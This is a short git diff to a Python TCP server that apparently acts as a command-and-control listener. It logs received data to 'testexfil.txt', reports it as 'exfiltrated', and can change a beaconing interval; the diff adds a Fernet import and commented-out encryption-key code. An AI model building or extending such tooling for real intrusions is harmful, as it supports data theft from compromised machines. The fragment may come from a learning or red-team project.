@@ -1,6 +1,8 @@
 import socketserver  
 import base64
 import time
+from cryptography.fernet import Fernet
+
 
 class TCPHandler(socketserver.BaseRequestHandler):
     """This class handles TCP requests and sends back commands from those requests
@@ -33,6 +35,11 @@ class TCPHandler(socketserver.BaseRequestHandler):
             f.write("\n" + self.received_data)
             f.close()
             print("testexfil.txt exfiltrated")
+
+            #key = Fernet.generate_key()
+            #with open("key.key", "wb") as key_file:
+            #    key_file.write(key) # if key exists, open("key.key", "rb").read()
+            # https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
 
         # change beaconing interval
         elif self.option == "3":
